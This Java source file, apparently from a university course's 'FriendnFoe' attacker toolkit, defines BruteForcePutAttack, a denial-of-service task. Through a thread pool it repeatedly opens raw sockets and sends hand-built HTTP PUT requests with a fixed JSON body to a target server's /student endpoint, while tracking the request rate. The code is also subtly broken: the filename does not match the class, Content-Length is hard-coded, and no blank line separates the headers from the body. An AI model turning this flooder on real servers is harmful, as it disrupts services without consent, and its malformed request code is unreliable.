/*
 * BruteForceAttack.java
 * Oct 30, 2012
 *
 * FriendnFoe Attacker
 * 
 * Copyright (C) 2012 Chandan Raj Rupakheti
 * 
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public License 
 * as published by the Free Software Foundation, either 
 * version 3 of the License, or any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/lgpl.html>.
 * 
 */

package foe;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;

/**
 * 
 * 
 * @author Chandan Raj Rupakheti (rupakhet@rose-hulman.edu)
 */
public class BruteForcePutAttack extends DOSAttack {
	private long connections;
	private long serviceTime; 
	private int iter = 0;
	/**
	 * @param host
	 * @param port
	 * @param uris
	 * @param threadPool
	 * @param taskPerSecond
	 */
	public BruteForcePutAttack(String host, int port, String[] uris,
			int threadPool, int taskPerSecond) {
		super(host, port, uris, threadPool, taskPerSecond);
		this.connections = 0;
		this.serviceTime = 0;
	}

	@Override
	public Runnable getTask() {
		Runnable task = new Runnable() {
			public void run() {
				long start = System.currentTimeMillis();
				
				Socket socket = null;
				try {
					// Open socket connection to the server
					socket = new Socket(host, port);
				}
				catch(Exception e) {
					fireDOSExceptionEvent(e);
				}

				if(socket != null) {
					// Use random index to avoid uniform pattern of http request
					String uri = "/student";
					
					String s = "{\"passphrase\" : \"Vault Boy\",\"name\" : \"Ronald Weasley\", \"house\" : \"Gryffindor\", \"location\" : \"???\"}";
					StringBuffer buffer2 = new StringBuffer();
					buffer2.append("PUT " + uri + " HTTP/1.1");
					buffer2.append("\r\n");
					buffer2.append("connection: keep-alive");
					buffer2.append("\r\n");
					buffer2.append("accept-language: en-us,en;q=0.5");
					buffer2.append("\r\n");
					buffer2.append("host: " + host);
					buffer2.append("\r\n");
					buffer2.append("accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7");
					buffer2.append("\r\n");
					buffer2.append("accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
					buffer2.append("\r\n");
					buffer2.append("Content-Length: 98");
					buffer2.append("\r\n");
					System.out.println(s.length());
					buffer2.append(s);
					buffer2.append("\r\n");
					
					try {
						// Write the request to the socket
						OutputStream outStream = socket.getOutputStream();
						PrintStream printStream = new PrintStream(outStream);
						printStream.print(buffer2.toString());
						printStream.flush();
						
						// Read and ignore the request
						InputStream inStream = socket.getInputStream();
						byte[] chunk = new byte[4096]; // read 4KB chunk at a time
						
						// Keep reading until the end but ignore the data. See ";" at the end of while
						// which means do nothing
						while(inStream.read(chunk) != -1);
						
						// Close the socket
						socket.close();
					}
					catch(Exception e) {
						fireDOSExceptionEvent(e);
					}
				}

				
				// Update metrics
				long end = System.currentTimeMillis();
				long diff = end-start;
				double serviceRate;
				synchronized(BruteForcePutAttack.this) {
					connections += 1;
					serviceTime += diff;
					serviceRate = connections / (double)serviceTime;
					serviceRate = serviceRate * 1000;
				}
				
				fireDOSRateUpdateEvent("Update-Rate", "" + serviceRate);
			}
		};
		return task;
	}
}
